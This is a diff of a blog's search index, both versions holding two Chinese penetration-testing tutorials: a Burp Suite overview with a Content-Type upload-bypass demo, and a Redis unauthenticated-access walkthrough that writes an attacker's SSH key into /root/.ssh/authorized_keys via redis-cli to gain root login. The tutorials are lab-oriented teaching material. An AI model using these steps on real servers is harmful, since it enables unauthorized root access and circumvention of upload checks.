@@ -1,93 +1,33 @@
 <?xml version="1.0" encoding="utf-8"?>
-<search>
-  <entry>
-    <title>Burpsuite简介及MIME上传绕过实例</title>
-    <url>/liuzhong3639.github.io/2020/08/18/Burpsuite%E7%AE%80%E4%BB%8B%E5%8F%8AMIME%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%AE%9E%E4%BE%8B/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\liuzhong3639.github.io\assets\css\APlayer.min.css"><script src="\liuzhong3639.github.io\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="了解burpsuite"><a href="#了解burpsuite" class="headerlink" title="了解burpsuite"></a>了解burpsuite</h1><p>   Burp Suite是用于攻击web应用程序的集成平台。包含了许多工具，并为这些工具设计了许多接口，以促进加快攻击应用程序的过程。所有的工具都共享一个能处理并显示HTTP消息，持久性，认证，代理，日志，警报的可扩展的框架。</p>
-<p>   在一个工具处理HTTP请求和响应时，它可以选择调用其他任意的 Burp 工具。例如，代理记录的请求可被Intruder用来构造一个自定义的自动攻击的准则，也可被 Repeater 用来手动攻击，也可被 Scanner 用来分析漏洞，或者被 Spider(网络爬虫)用来自动搜索内容。</p>
-<p>Burpsuite主要有如下模块/功能：</p>
-<p>   1.Target，显示目标站点目录结构</p>
-<p>   2.Proxy，是一个拦截HTTP/S的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流。</p>
-<p>   3.Spider，是一个应用智能感应的网络爬虫，它能完整的枚举应用程序的内容和功能。</p>
-<p>   4.Scanner，是一个高级工具，执行后，它能自动地发现web 应用程序的安全漏洞。</p>
-<p>   5.Intruder，是一个定制的高度可配置的工具，对web应用程序进行自动化攻击，如：枚举标识符，收集有用的数据，以及使用fuzzing 技术探测常规漏洞。</p>
-<p>   6.Repeater，是一个靠手动操作来触发单独的HTTP 请求，并分析应用程序响应的工具。</p>
-<p>   7.Sequencer，是一个用来分析那些不可预知的应用程序会话令牌和重要数据项的随机性的工具。</p>
-<p>   8.Decoder，是一个进行手动执行或对应用程序数据者智能解码编码的工具。</p>
-<p>   9.Comparer，通常是通过一些相关的请求和响应得到两项数据的一个可视化的“差异”。</p>
-<p>   10.Extender，可以让你加载Burp Suite的扩展，使用你自己的或第三方代码来扩展Burp Suit的功能。</p>
-<p>   11.Options，对Burp Suite的一些设置</p>
-<h1 id="了解服务端MIME类型检测"><a href="#了解服务端MIME类型检测" class="headerlink" title="了解服务端MIME类型检测"></a>了解服务端MIME类型检测</h1><p> 服务端MIME检测类型图片上传过程中http包的Content-Type是否为image/jpeg，如果是就可以成功上传。相关源代码：</p>
-<p><img src= "/liuzhong3639.github.io/img/loading.gif" data-src="https://liuzhong.oss-cn-hangzhou.aliyuncs.com/3323/headImg.jpg" alt="1"></p>
-<p>  可以看到红色区域中的if语句只对Content-Type和图片的大小做了判断。</p>
-<h1 id="使用Burpsuite的代理功能"><a href="#使用Burpsuite的代理功能" class="headerlink" title="使用Burpsuite的代理功能"></a>使用Burpsuite的代理功能</h1><p>   访问<a href="http://10.1.1.59:81，输入用户名：admin，密码：password，打开burpsuite，设置好浏览器代理，点击sql">http://10.1.1.59:81，输入用户名：admin，密码：password，打开burpsuite，设置好浏览器代理，点击sql</a> injection，</p>
-<p><img src= "/liuzhong3639.github.io/img/loading.gif" data-src="https://liuzhong.oss-cn-hangzhou.aliyuncs.com/3323/headImg1.jpg" alt="1"></p>
-<p>截获的数据包如下</p>
-<p><img src= "/liuzhong3639.github.io/img/loading.gif" data-src="https://liuzhong.oss-cn-hangzhou.aliyuncs.com/3323/headImg2.png" alt="1"></p>
-<p>  单击右键，如下图所示：</p>
-<p><img src= "/liuzhong3639.github.io/img/loading.gif" data-src="https://liuzhong.oss-cn-hangzhou.aliyuncs.com/3323/headImg3.png" alt=""></p>
-<p>   Send to XXX分别表示将截获的数据发送到各个模块，然后在各个模块下进行下一步操作。</p>
-<p>   下拉菜单 点击Send to Spider切换到Spider模块下，burpsuite会自动对网站进行爬行，切换到Control选项卡下可以查看爬行的状态和设置爬行范围，Options选项卡中可以进行爬行的设置等。一段时间后切换到Target模块查看结果。</p>
-<p><img src= "/liuzhong3639.github.io/img/loading.gif" data-src="https://liuzhong.oss-cn-hangzhou.aliyuncs.com/3323/headImg4.png" alt=""></p>
-<p>  Change request method表示更改请求方式，如之前使用的GET请求，点击Change request method后为变为POST</p>
-<p><img src= "/liuzhong3639.github.io/img/loading.gif" data-src="https://liuzhong.oss-cn-hangzhou.aliyuncs.com/3323/headImg5.png" alt=""></p>
-<p><img src= "/liuzhong3639.github.io/img/loading.gif" data-src="https://liuzhong.oss-cn-hangzhou.aliyuncs.com/3323/headImg6.png" alt=""></p>
-<p>  Don’t intercept requests表示不截获请求，比如我们选择To this host，在Intercept is on时burp也不对此主机的请求做拦截。我们就可以正常访问该网页了。</p>
-<p><img src= "/liuzhong3639.github.io/img/loading.gif" data-src="https://liuzhong.oss-cn-hangzhou.aliyuncs.com/3323/headImg7.png" alt=""></p>
-<p>   Do intercept下Response to this request功能可用于对服务端发送过来的信息做修改来欺骗浏览器。</p>
-<p>   如果开启URL-encode as you type表示对你输入的&amp;，=等字符将会被URL编码替换。</p>
-<p>Target模块</p>
-<p>   这个模块下有两个选项卡，Site map主要是将爬行的站点以树形结构显示，Scope主要是用来设置范围进行过滤。</p>
-<p>   有时当我们对一个目标网址进行测试时，Site map下会出现许多不相关的网址，我们可以使用Filter来过滤，只留下目标网址</p>
-<p><img src= "/liuzhong3639.github.io/img/loading.gif" data-src="https://liuzhong.oss-cn-hangzhou.aliyuncs.com/3323/headImg11.png" alt=""></p>
-<p> 点击Filter，勾选Show only in-scope items</p>
-<p><img src= "/liuzhong3639.github.io/img/loading.gif" data-src="https://liuzhong.oss-cn-hangzhou.aliyuncs.com/3323/headImg12.png" alt=""></p>
-<p>   此时Site map下只剩下目标网址了</p>
-<p><img src= "/liuzhong3639.github.io/img/loading.gif" data-src="https://liuzhong.oss-cn-hangzhou.aliyuncs.com/3323/headImg13.png" alt=""></p>
-<p>  然后我们随便点击一个目录又会出现许多功能</p>
-<p><img src= "/liuzhong3639.github.io/img/loading.gif" data-src="https://liuzhong.oss-cn-hangzhou.aliyuncs.com/3323/headImg14.png" alt="2"></p>
-<p>点击Remove from scope，比如我此时选择css，该目录就会消失，对应的Scope选项卡下便会多出一条记录</p>
-<p><img src= "/liuzhong3639.github.io/img/loading.gif" data-src="https://liuzhong.oss-cn-hangzhou.aliyuncs.com/3323/headImg15.png" alt=""></p>
-<p> 点击Spider this branch，burp就会对该目录进行爬行</p>
-<p>   点击Expand branch来展开分支，其他功能不是很常用，有兴趣的小伙伴可以自行研究哦。</p>
-<p>   Site map选项卡右边可以看到一些请求的信息，在Host下可以选择对链接进行高亮显示，comment下可以添加注释，针对单个链接也可进行右键操作。</p>
-<h1 id="使用burpsuite上传绕过服务端MIME类型检测"><a href="#使用burpsuite上传绕过服务端MIME类型检测" class="headerlink" title="使用burpsuite上传绕过服务端MIME类型检测"></a>使用burpsuite上传绕过服务端MIME类型检测</h1><p>1.首先在桌面上新建一个1.txt，此处我写入“hello_world”。因为目标主机只允许我们上传jpg文件，那么我们下载就要绕过这个限制，上传一个txt文件上去。</p>
-<p><img src= "/liuzhong3639.github.io/img/loading.gif" data-src="https://liuzhong.oss-cn-hangzhou.aliyuncs.com/3323/headImg16.jpg" alt=""></p>
-<p>2.打开<a href="http://10.1.1.59:81，输入用户名：admin">http://10.1.1.59:81，输入用户名：admin</a> 密码：password，点击Upload</p>
-<p><img src= "/liuzhong3639.github.io/img/loading.gif" data-src="https://liuzhong.oss-cn-hangzhou.aliyuncs.com/3323/headImg17.jpg" alt=""></p>
-<p>3.设置好浏览器代理后，我们选择我们刚才创建的txt文件进行上传。此时burpsuite已经截获到了数据包，我们右击选择“send to reprater”</p>
-<p><img src= "/liuzhong3639.github.io/img/loading.gif" data-src="https://liuzhong.oss-cn-hangzhou.aliyuncs.com/3323/headImg18.png" alt=""></p>
-<p>4.切换到Repeater中将Content-Type后的text/plain修改为image/jpeg</p>
-<p><img src= "/liuzhong3639.github.io/img/loading.gif" data-src="https://liuzhong.oss-cn-hangzhou.aliyuncs.com/3323/headImg19.png" alt=""></p>
-<p>5.点击go，从右侧可以看到已经上传成功，在右下方输入1.txt进行搜索刚才上传的图片。</p>
-<p><img src= "/liuzhong3639.github.io/img/loading.gif" data-src="https://liuzhong.oss-cn-hangzhou.aliyuncs.com/3323/headImg20.jpg" alt=""></p>
-<p>6.关闭代理，打开搜索到的路径</p>
-<p><img src= "/liuzhong3639.github.io/img/loading.gif" data-src="https://liuzhong.oss-cn-hangzhou.aliyuncs.com/3323/headImg21.png" alt=""></p>
-<p>上传成功！</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>Redis写公钥拿服务器</title>
-    <url>/liuzhong3639.github.io/2020/07/30/Redis%E5%86%99%E5%85%AC%E9%92%A5%E6%8B%BF%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\liuzhong3639.github.io\assets\css\APlayer.min.css"><script src="\liuzhong3639.github.io\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h4 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h4><p>redis未授权访问，在公网存在很多这样的漏洞，这种漏洞某种情况下可进行写入ssh公钥，使得攻击者不用任何密码即可登陆服务器。接下来，我们来研究复现一下此漏洞吧</p>
-<p><img src= "/liuzhong3639.github.io/img/loading.gif" data-src="http://sec.hqjs.xyz/wp-content/uploads/2019/10/image-1.png" alt="img"></p>
-<h4 id="环境要求："><a href="#环境要求：" class="headerlink" title="环境要求："></a>环境要求：</h4><p>redis其他地址可访问</p>
-<p>redis关闭保护模式</p>
-<p>被攻击服务器开启ssh密钥登陆</p>
-<p>root权限运行redis</p>
-<h4 id="复现步骤："><a href="#复现步骤：" class="headerlink" title="复现步骤："></a>复现步骤：</h4><p>1-攻击机设置ssh无密码登陆</p>
-<p>ssh-keygen -t rsa</p>
-<p>回车</p>
-<p><img src= "/liuzhong3639.github.io/img/loading.gif" data-src="http://sec.hqjs.xyz/wp-content/uploads/2019/10/image.png" alt="img"></p>
-<p>2-回到/root/.ssh目录<br>执行如下命令</p>
-<p>(echo -e “\n\n”;cat id_rsa.pub;echo -e “\n\n”)&gt;1.txt<br>cat 1.txt |redis-cli -h 192.168.147.133 -x set crack</p>
-<p><img src= "/liuzhong3639.github.io/img/loading.gif" data-src="http://sec.hqjs.xyz/wp-content/uploads/2019/10/image-2-1024x179.png" alt="img"></p>
-<p>3-连接redis</p>
-<p>config get dir<br>config set dir /root/.ssh<br>config set dbfilename authorized_keys<br>config get dbfilename<br>save<br>exit</p>
-<p>4-ssh密钥连接</p>
-<p>ssh -i id_rsa <a href="mailto:root@192.168.147.133">root@192.168.147.133</a></p>
-<p>连接成功，成功拿下服务器，是不是特别简单</p>
-<p><img src= "/liuzhong3639.github.io/img/loading.gif" data-src="http://sec.hqjs.xyz/wp-content/uploads/2019/10/image-3-1024x505.png" alt="img"></p>
-]]></content>
-  </entry>
+<search> 
+  
+  
+    
+    <entry>
+      <title>Burpsuite简介及MIME上传绕过实例</title>
+      <link href="/liuzhong3639.github.io/2020/08/18/Burpsuite%E7%AE%80%E4%BB%8B%E5%8F%8AMIME%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%AE%9E%E4%BE%8B/"/>
+      <url>/liuzhong3639.github.io/2020/08/18/Burpsuite%E7%AE%80%E4%BB%8B%E5%8F%8AMIME%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%AE%9E%E4%BE%8B/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\liuzhong3639.github.io\assets\css\APlayer.min.css"><script src="\liuzhong3639.github.io\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="了解burpsuite"><a href="#了解burpsuite" class="headerlink" title="了解burpsuite"></a>了解burpsuite</h1><p>   Burp Suite是用于攻击web应用程序的集成平台。包含了许多工具，并为这些工具设计了许多接口，以促进加快攻击应用程序的过程。所有的工具都共享一个能处理并显示HTTP消息，持久性，认证，代理，日志，警报的可扩展的框架。</p><p>   在一个工具处理HTTP请求和响应时，它可以选择调用其他任意的 Burp 工具。例如，代理记录的请求可被Intruder用来构造一个自定义的自动攻击的准则，也可被 Repeater 用来手动攻击，也可被 Scanner 用来分析漏洞，或者被 Spider(网络爬虫)用来自动搜索内容。</p><p>Burpsuite主要有如下模块/功能：</p><p>   1.Target，显示目标站点目录结构</p><p>   2.Proxy，是一个拦截HTTP/S的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流。</p><p>   3.Spider，是一个应用智能感应的网络爬虫，它能完整的枚举应用程序的内容和功能。</p><p>   4.Scanner，是一个高级工具，执行后，它能自动地发现web 应用程序的安全漏洞。</p><p>   5.Intruder，是一个定制的高度可配置的工具，对web应用程序进行自动化攻击，如：枚举标识符，收集有用的数据，以及使用fuzzing 技术探测常规漏洞。</p><p>   6.Repeater，是一个靠手动操作来触发单独的HTTP 请求，并分析应用程序响应的工具。</p><p>   7.Sequencer，是一个用来分析那些不可预知的应用程序会话令牌和重要数据项的随机性的工具。</p><p>   8.Decoder，是一个进行手动执行或对应用程序数据者智能解码编码的工具。</p><p>   9.Comparer，通常是通过一些相关的请求和响应得到两项数据的一个可视化的“差异”。</p><p>   10.Extender，可以让你加载Burp Suite的扩展，使用你自己的或第三方代码来扩展Burp Suit的功能。</p><p>   11.Options，对Burp Suite的一些设置</p><h1 id="了解服务端MIME类型检测"><a href="#了解服务端MIME类型检测" class="headerlink" title="了解服务端MIME类型检测"></a>了解服务端MIME类型检测</h1><p> 服务端MIME检测类型图片上传过程中http包的Content-Type是否为image/jpeg，如果是就可以成功上传。相关源代码：</p><p><img src= "/liuzhong3639.github.io/img/loading.gif" data-src="https://liuzhong.oss-cn-hangzhou.aliyuncs.com/3323/headImg.jpg" alt="1"></p><p>  可以看到红色区域中的if语句只对Content-Type和图片的大小做了判断。</p><h1 id="使用Burpsuite的代理功能"><a href="#使用Burpsuite的代理功能" class="headerlink" title="使用Burpsuite的代理功能"></a>使用Burpsuite的代理功能</h1><p>   访问<a href="http://10.1.1.59:81，输入用户名：admin，密码：password，打开burpsuite，设置好浏览器代理，点击sql">http://10.1.1.59:81，输入用户名：admin，密码：password，打开burpsuite，设置好浏览器代理，点击sql</a> injection，</p><p><img src= "/liuzhong3639.github.io/img/loading.gif" data-src="https://liuzhong.oss-cn-hangzhou.aliyuncs.com/3323/headImg1.jpg" alt="1"></p><p>截获的数据包如下</p><p><img src= "/liuzhong3639.github.io/img/loading.gif" data-src="https://liuzhong.oss-cn-hangzhou.aliyuncs.com/3323/headImg2.png" alt="1"></p><p>  单击右键，如下图所示：</p><p><img src= "/liuzhong3639.github.io/img/loading.gif" data-src="https://liuzhong.oss-cn-hangzhou.aliyuncs.com/3323/headImg3.png" alt=""></p><p>   Send to XXX分别表示将截获的数据发送到各个模块，然后在各个模块下进行下一步操作。</p><p>   下拉菜单 点击Send to Spider切换到Spider模块下，burpsuite会自动对网站进行爬行，切换到Control选项卡下可以查看爬行的状态和设置爬行范围，Options选项卡中可以进行爬行的设置等。一段时间后切换到Target模块查看结果。</p><p><img src= "/liuzhong3639.github.io/img/loading.gif" data-src="https://liuzhong.oss-cn-hangzhou.aliyuncs.com/3323/headImg4.png" alt=""></p><p>  Change request method表示更改请求方式，如之前使用的GET请求，点击Change request method后为变为POST</p><p><img src= "/liuzhong3639.github.io/img/loading.gif" data-src="https://liuzhong.oss-cn-hangzhou.aliyuncs.com/3323/headImg5.png" alt=""></p><p><img src= "/liuzhong3639.github.io/img/loading.gif" data-src="https://liuzhong.oss-cn-hangzhou.aliyuncs.com/3323/headImg6.png" alt=""></p><p>  Don’t intercept requests表示不截获请求，比如我们选择To this host，在Intercept is on时burp也不对此主机的请求做拦截。我们就可以正常访问该网页了。</p><p><img src= "/liuzhong3639.github.io/img/loading.gif" data-src="https://liuzhong.oss-cn-hangzhou.aliyuncs.com/3323/headImg7.png" alt=""></p><p>   Do intercept下Response to this request功能可用于对服务端发送过来的信息做修改来欺骗浏览器。</p><p>   如果开启URL-encode as you type表示对你输入的&amp;，=等字符将会被URL编码替换。</p><p>Target模块</p><p>   这个模块下有两个选项卡，Site map主要是将爬行的站点以树形结构显示，Scope主要是用来设置范围进行过滤。</p><p>   有时当我们对一个目标网址进行测试时，Site map下会出现许多不相关的网址，我们可以使用Filter来过滤，只留下目标网址</p><p><img src= "/liuzhong3639.github.io/img/loading.gif" data-src="https://liuzhong.oss-cn-hangzhou.aliyuncs.com/3323/headImg11.png" alt=""></p><p> 点击Filter，勾选Show only in-scope items</p><p><img src= "/liuzhong3639.github.io/img/loading.gif" data-src="https://liuzhong.oss-cn-hangzhou.aliyuncs.com/3323/headImg12.png" alt=""></p><p>   此时Site map下只剩下目标网址了</p><p><img src= "/liuzhong3639.github.io/img/loading.gif" data-src="https://liuzhong.oss-cn-hangzhou.aliyuncs.com/3323/headImg13.png" alt=""></p><p>  然后我们随便点击一个目录又会出现许多功能</p><p><img src= "/liuzhong3639.github.io/img/loading.gif" data-src="https://liuzhong.oss-cn-hangzhou.aliyuncs.com/3323/headImg14.png" alt="2"></p><p>点击Remove from scope，比如我此时选择css，该目录就会消失，对应的Scope选项卡下便会多出一条记录</p><p><img src= "/liuzhong3639.github.io/img/loading.gif" data-src="https://liuzhong.oss-cn-hangzhou.aliyuncs.com/3323/headImg15.png" alt=""></p><p> 点击Spider this branch，burp就会对该目录进行爬行</p><p>   点击Expand branch来展开分支，其他功能不是很常用，有兴趣的小伙伴可以自行研究哦。</p><p>   Site map选项卡右边可以看到一些请求的信息，在Host下可以选择对链接进行高亮显示，comment下可以添加注释，针对单个链接也可进行右键操作。</p><h1 id="使用burpsuite上传绕过服务端MIME类型检测"><a href="#使用burpsuite上传绕过服务端MIME类型检测" class="headerlink" title="使用burpsuite上传绕过服务端MIME类型检测"></a>使用burpsuite上传绕过服务端MIME类型检测</h1><p>1.首先在桌面上新建一个1.txt，此处我写入“hello_world”。因为目标主机只允许我们上传jpg文件，那么我们下载就要绕过这个限制，上传一个txt文件上去。</p><p><img src= "/liuzhong3639.github.io/img/loading.gif" data-src="https://liuzhong.oss-cn-hangzhou.aliyuncs.com/3323/headImg16.jpg" alt=""></p><p>2.打开<a href="http://10.1.1.59:81，输入用户名：admin">http://10.1.1.59:81，输入用户名：admin</a> 密码：password，点击Upload</p><p><img src= "/liuzhong3639.github.io/img/loading.gif" data-src="https://liuzhong.oss-cn-hangzhou.aliyuncs.com/3323/headImg17.jpg" alt=""></p><p>3.设置好浏览器代理后，我们选择我们刚才创建的txt文件进行上传。此时burpsuite已经截获到了数据包，我们右击选择“send to reprater”</p><p><img src= "/liuzhong3639.github.io/img/loading.gif" data-src="https://liuzhong.oss-cn-hangzhou.aliyuncs.com/3323/headImg18.png" alt=""></p><p>4.切换到Repeater中将Content-Type后的text/plain修改为image/jpeg</p><p><img src= "/liuzhong3639.github.io/img/loading.gif" data-src="https://liuzhong.oss-cn-hangzhou.aliyuncs.com/3323/headImg19.png" alt=""></p><p>5.点击go，从右侧可以看到已经上传成功，在右下方输入1.txt进行搜索刚才上传的图片。</p><p><img src= "/liuzhong3639.github.io/img/loading.gif" data-src="https://liuzhong.oss-cn-hangzhou.aliyuncs.com/3323/headImg20.jpg" alt=""></p><p>6.关闭代理，打开搜索到的路径</p><p><img src= "/liuzhong3639.github.io/img/loading.gif" data-src="https://liuzhong.oss-cn-hangzhou.aliyuncs.com/3323/headImg21.png" alt=""></p><p>上传成功！</p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Redis写公钥拿服务器</title>
+      <link href="/liuzhong3639.github.io/2020/07/30/Redis%E5%86%99%E5%85%AC%E9%92%A5%E6%8B%BF%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
+      <url>/liuzhong3639.github.io/2020/07/30/Redis%E5%86%99%E5%85%AC%E9%92%A5%E6%8B%BF%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\liuzhong3639.github.io\assets\css\APlayer.min.css"><script src="\liuzhong3639.github.io\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h4 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h4><p>redis未授权访问，在公网存在很多这样的漏洞，这种漏洞某种情况下可进行写入ssh公钥，使得攻击者不用任何密码即可登陆服务器。接下来，我们来研究复现一下此漏洞吧</p><p><img src= "/liuzhong3639.github.io/img/loading.gif" data-src="http://sec.hqjs.xyz/wp-content/uploads/2019/10/image-1.png" alt="img"></p><h4 id="环境要求："><a href="#环境要求：" class="headerlink" title="环境要求："></a>环境要求：</h4><p>redis其他地址可访问</p><p>redis关闭保护模式</p><p>被攻击服务器开启ssh密钥登陆</p><p>root权限运行redis</p><h4 id="复现步骤："><a href="#复现步骤：" class="headerlink" title="复现步骤："></a>复现步骤：</h4><p>1-攻击机设置ssh无密码登陆</p><p>ssh-keygen -t rsa</p><p>回车</p><p><img src= "/liuzhong3639.github.io/img/loading.gif" data-src="http://sec.hqjs.xyz/wp-content/uploads/2019/10/image.png" alt="img"></p><p>2-回到/root/.ssh目录<br>执行如下命令</p><p>(echo -e “\n\n”;cat id_rsa.pub;echo -e “\n\n”)&gt;1.txt<br>cat 1.txt |redis-cli -h 192.168.147.133 -x set crack</p><p><img src= "/liuzhong3639.github.io/img/loading.gif" data-src="http://sec.hqjs.xyz/wp-content/uploads/2019/10/image-2-1024x179.png" alt="img"></p><p>3-连接redis</p><p>config get dir<br>config set dir /root/.ssh<br>config set dbfilename authorized_keys<br>config get dbfilename<br>save<br>exit</p><p>4-ssh密钥连接</p><p>ssh -i id_rsa <a href="mailto:root@192.168.147.133">root@192.168.147.133</a></p><p>连接成功，成功拿下服务器，是不是特别简单</p><p><img src= "/liuzhong3639.github.io/img/loading.gif" data-src="http://sec.hqjs.xyz/wp-content/uploads/2019/10/image-3-1024x505.png" alt="img"></p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+  
+  
 </search>
